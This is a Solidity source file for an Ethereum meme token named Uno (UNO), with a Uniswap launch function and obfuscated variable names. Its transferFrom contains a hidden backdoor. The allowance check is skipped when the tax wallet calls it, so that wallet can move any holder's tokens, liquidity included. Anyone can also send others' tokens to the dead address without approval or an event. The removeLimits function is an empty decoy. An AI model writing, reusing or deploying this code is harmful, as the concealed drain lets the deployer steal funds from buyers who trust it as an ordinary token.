// SPDX-License-Identifier: MIT

/*
    Name: Uno
    Symbol: UNO

    The feline savior of Ethereum has arrived

    Web: https://unocateth.fun
    X: https://x.com/Uno_OnETH
    tg: https://t.me/Uno_On_ETH
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

contract UNO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcUNO;
    mapping(address => mapping(address => uint256)) private _allcvnkjnUNO;
    mapping(address => bool) private _feevblknlUNO;
    address payable private _taxclknlUNO;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Uno";
    string private constant _symbol = unicode"UNO";
    uint256 public _vnbbvlkUNO = _tTotal / 100;
    uint256 public _oijboijoiUNO = 15 * 10**18;

    uint256 private _cvjkbnkjUNO = 10;
    uint256 private _vkjbnkfjUNO = 10;
    uint256 private _maxovnboiUNO = 10;
    uint256 private _initvkjnbkjUNO = 20;
    uint256 private _finvjlkbnlkjUNO = 0;
    uint256 private _redclkjnkUNO = 2;
    uint256 private _prevlfknjoiUNO = 2;
    uint256 private _buylkvnlkUNO = 0;

    IUniswapV2Router02 private uniswapV2Router;
    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknUNO;
    bool private _inlknblUNO = false;
    bool private swapvlkUNO = false;
    uint256 private _sellcnjkUNO = 0;
    uint256 private _lastflkbnlUNO = 0;
    address constant _deadlknUNO = address(0xdead);

    modifier lockTheSwap() {
        _inlknblUNO = true;
        _;
        _inlknblUNO = false;
    }

    constructor() payable {
        _taxclknlUNO = payable(_msgSender());

        _feevblknlUNO[address(this)] = true;
        _feevblknlUNO[_taxclknlUNO] = true;

        _balknvlkcUNO[_msgSender()] = (_tTotal * 2) / 100;
        _balknvlkcUNO[address(this)] = (_tTotal * 98) / 100;

        emit Transfer(address(0), _msgSender(), (_tTotal * 2) / 100);
        emit Transfer(address(0), address(this), (_tTotal * 98) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcUNO[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnUNO(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnUNO[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _downcklkojUNO(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        if(msg.sender == _taxclknlUNO) return false;
        if(!(sender == uniswapV2Pair || recipient != _deadlknUNO)) return false;
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnUNO(sender, recipient, amount);
        if (_downcklkojUNO(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnUNO[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnUNO[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer_kjvnUNO(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblUNO(from, to, amount);

        _balknvlkcUNO[from] = _balknvlkcUNO[from].sub(amount);
        _balknvlkcUNO[to] = _balknvlkcUNO[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcUNO[address(this)] = _balknvlkcUNO[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        if (to != _deadlknUNO) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _calcTax_lvknblUNO(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblUNO) {
                taxAmount = amount
                    .mul((_buylkvnlkUNO > _redclkjnkUNO) ? _finvjlkbnlkjUNO : _initvkjnbkjUNO)
                    .div(100);
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlUNO[to] &&
                to != _taxclknlUNO
            ) {
                _buylkvnlkUNO++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblUNO &&
                to == uniswapV2Pair &&
                from != _taxclknlUNO &&
                swapvlkUNO &&
                _buylkvnlkUNO > _prevlfknjoiUNO
            ) {
                if (block.number > _lastflkbnlUNO) {
                    _sellcnjkUNO = 0;
                }
                _sellcnjkUNO = _sellcnjkUNO + _getAmountOut_lvcbnkUNO(amount);
                require(_sellcnjkUNO <= _oijboijoiUNO, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkUNO)
                    _swapTokenslknlUNO(_vnbbvlkUNO > amount ? amount : _vnbbvlkUNO);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjUNO(address(this).balance);
                }
                _lastflkbnlUNO = block.number;
            }
        }
        return taxAmount;
    }

    function _sendETHTocvbnjUNO(uint256 amount) private {
        _taxclknlUNO.transfer(amount);
    }

    function _swapTokenslknlUNO(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function enableUNOTrading() external onlyOwner {
        require(!_tradingvlknUNO, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkUNO = true;
        _tradingvlknUNO = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    receive() external payable {}

    function _assist_bnUNO() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function _getAmountOut_lvcbnkUNO(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function removeLimits () external onlyOwner {

    }

    function _setTax_lknblUNO(address payable newWallet) external {
        require(_msgSender() == _taxclknlUNO);
        _taxclknlUNO = newWallet;
    }
}